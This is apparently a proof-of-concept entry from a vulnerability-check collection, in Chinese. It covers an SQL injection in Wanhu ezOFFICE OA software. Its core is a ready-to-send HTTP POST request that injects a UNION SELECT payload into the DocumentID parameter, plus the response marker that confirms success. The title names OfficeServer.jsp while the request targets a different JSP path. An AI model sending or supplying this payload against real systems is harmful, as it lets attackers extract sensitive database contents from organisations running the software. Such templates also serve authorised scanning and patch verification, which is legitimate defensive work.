﻿# 万户 ezOFFICE OfficeServer.jsp 存在SQL注入漏洞 测二

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：北京万户网络技术有限公司ezOFFICE OfficeServer.jsp 存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。

> 漏洞特征：

> 验证脚本：HTTP

```
POST /defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=11'+UNION+ALL+SELECT+NULL,NULL,CHAR(113)%2BCHAR(107)%2BCHAR(113)%2BCHAR(112)%2BCHAR(113)%2BCHAR(68)%2BCHAR(72)%2BCHAR(116)%2BCHAR(113)%2BCHAR(107)%2BCHAR(113)%2BCHAR(112)%2BCHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)%2BCHAR(107)%2BCHAR(113)%2BCHAR(112)%2BCHAR(113)%2BCHAR(68)%2BCHAR(72)%2BCHAR(116)%2BCHAR(113)%2BCHAR(107)%2BCHAR(113)%2BCHAR(112)%2BCHAR(113),NULL--+QAJc&XYBH=1&BMJH=1&JF=1&YF=1&HZNR=1&QLZR=1&CPMC=1&DGSL=1&DGRQ=1&XYBH=1&BMJH=1&JF=1&YF=1&HZNR=1&QLZR=1&CPMC=1&DGSL=1&DGRQ=1 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
```

> 响应代码特征：-1

> 响应内容特征：qkqpqDHtqkqpq

> 上传文件定位：

> 验证文件来源：万户 OA OfficeServer.jsp 存在SQL注入漏洞 测二.poc
